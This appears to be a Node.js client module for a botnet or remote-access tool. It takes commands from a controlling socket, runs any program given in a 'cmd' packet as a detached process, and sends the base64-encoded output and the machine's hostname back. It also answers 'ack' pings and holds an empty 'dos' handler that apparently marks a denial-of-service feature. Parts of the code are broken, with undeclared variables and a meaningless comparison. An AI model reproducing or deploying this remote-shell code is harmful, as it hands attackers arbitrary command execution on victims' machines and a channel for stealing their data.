module.exports = function() {
    return (function(baseSocket) {
        var self = this;
        var os = require('os')
        var Packet = require('../models/packet');
        var send = require('../io/sender')(baseSocket).send;
        var spawn = require('child_process').spawn;

        var childObject;
        var sender_id;
        var receiver_id;

        var processCommand = function(cmd, cmdData) {
            if (cmd === 'cmd') {
                var output;

                console.log(`cmdData ${cmdData}`);

                var splitted = cmdData.split(' ');
                console.log(`splitted: ${splitted}`);
                var firstElement = splitted[0];
                splitted.shift();
                var args = splitted;
                console.log(`args: ${args}`);
                if (args === firstElement) args = [];
                try {
                    childObject = spawn(firstElement, args, {
                        detached: true
                    });

                    childObject.stdout.setEncoding('utf8');
                    childObject.stdout.on('data', function(data) {
                        console.log('stdout: ' + data);
                        output = data;
                        var toSend = new Packet(self.sender_id, self.receiver_id, {
                            output: new Buffer(output).toString('base64'),
                            name: hostname
                        });
                        send(toSend);
                    });
                } catch (err) {
                    console.log("something went wrong");
                    console.log(`error message: ${err}`);
                }
            } else if (cmd === "ack") {
                hostname = os.hostname();
                var toSend = new Packet(self.sender_id, self.receiver_id, {
                    name: hostname
                });
                send(toSend);
            } else if (cmd === "dos") {
                //Handle Kira package
            } else if (cmd === 'kill') {
                childObject.kill();
            }
        };

        var processPacket = function(packet, sender_id, receiver_id) {
            self.sender_id = sender_id;
            self.receiver_id = receiver_id;
            //var parsedPacket = parser.decode(packet);
            for (let cmd in packet.data) {
                // processCommand(cmd, packet.data[cmd], packet);
                processCommand(cmd, packet.data[cmd], packet);
            }
        };

        var execute = function(packet) {
            var commands = [];
            var promises = [];

            for (var commandName in packet.data) {
                commands.push(commandName);
            }

            require('fs').readdirSync(normalizedPath).forEach((file) => {
                let command = commands.indexOf(file);
                if (command >= 0) {
                    let module = require(`${normalizedPath}${file}`)(packet.data[command]);
                    promises.push(module.execute(packet.data));
                }
            });
            return Promise.all(promises);
        };

        return {
            execute: execute,
            processCommand: processCommand,
            processPacket: processPacket
        }
    });
}();
